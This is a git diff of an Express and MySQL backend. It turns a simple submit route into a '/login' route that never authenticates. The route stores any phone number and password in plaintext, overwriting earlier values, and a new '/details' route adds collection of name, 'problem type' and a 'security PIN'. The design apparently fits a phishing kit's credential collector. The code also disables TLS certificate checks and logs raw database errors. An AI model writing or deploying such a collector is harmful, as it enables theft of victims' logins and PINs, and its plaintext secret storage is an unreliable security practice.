@@ -9,15 +9,8 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-console.log({
-    host: process.env.MYSQL_HOST,
-    port: process.env.MYSQL_PORT,
-    user: process.env.MYSQL_USER,
-    database: process.env.MYSQL_DATABASE
-});
-
 // ======================
-// MySQL Pool
+// Database
 // ======================
 
 const db = mysql.createPool({
@@ -28,75 +21,139 @@ const db = mysql.createPool({
     database: process.env.MYSQL_DATABASE,
 
     waitForConnections: true,
-    connectionLimit: 5,
+    connectionLimit: 10,
     queueLimit: 0,
-
-    connectTimeout: 10000,
-    enableKeepAlive: true,
-    keepAliveInitialDelay: 0,
 
     ssl: {
         rejectUnauthorized: false
     }
 });
 
-// Test Connection
 db.getConnection((err, connection) => {
+
     if (err) {
-        console.error("❌ MySQL Error");
-        console.error("Code:", err.code);
-        console.error("Message:", err.message);
+        console.log("Database Error");
+        console.log(err);
         return;
     }
 
-    console.log("✅ MySQL Connected Successfully");
+    console.log("✅ MySQL Connected");
+
     connection.release();
+
 });
 
 // ======================
-// Routes
+// Login Form
 // ======================
 
-app.get("/", (req, res) => {
-    res.send("Backend Running Successfully");
-});
-
-app.post("/submit", (req, res) => {
+app.post("/login", (req, res) => {
 
     const { phone, password } = req.body;
 
     if (!phone || !password) {
+
         return res.status(400).json({
-            success: false,
-            message: "Phone and Password are required"
+            message: "Phone and Password Required"
         });
+
     }
 
-    const sql = "INSERT INTO users(phone, password) VALUES (?, ?)";
+    const sql = `
+    INSERT INTO users(phone,password)
+    VALUES(?,?)
+    ON DUPLICATE KEY UPDATE
+    password=VALUES(password)
+    `;
 
-    db.query(sql, [phone, password], (err, result) => {
+    db.query(sql, [phone, password], (err) => {
 
         if (err) {
-            console.error(err);
+
+            console.log(err);
 
             return res.status(500).json({
-                success: false,
                 message: "Database Error"
             });
+
         }
 
         res.json({
             success: true,
-            message: "Data Saved Successfully",
-            id: result.insertId
+            message: "Login Saved"
         });
+
     });
+
+});
+
+// ======================
+// Details Form
+// ======================
+
+app.post("/details", (req, res) => {
+
+    const {
+        phone,
+        fullName,
+        problemType,
+        securityPin,
+        experienceLevel
+    } = req.body;
+
+    const sql = `
+    UPDATE users
+    SET
+    full_name=?,
+    problem_type=?,
+    security_pin=?,
+    experience_level=?
+    WHERE phone=?
+    `;
+
+    db.query(sql, [
+
+        fullName,
+        problemType,
+        securityPin,
+        experienceLevel,
+        phone
+
+    ], (err) => {
+
+        if (err) {
+
+            console.log(err);
+
+            return res.status(500).json({
+                message: "Database Error"
+            });
+
+        }
+
+        res.json({
+
+            success: true,
+            message: "Details Saved"
+
+        });
+
+    });
+
 });
 
 // ======================
 
+app.get("/", (req, res) => {
+
+    res.send("Backend Running");
+
+});
+
 const PORT = process.env.PORT || 5500;
 
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+
+    console.log(`Server Running On ${PORT}`);
+
 });
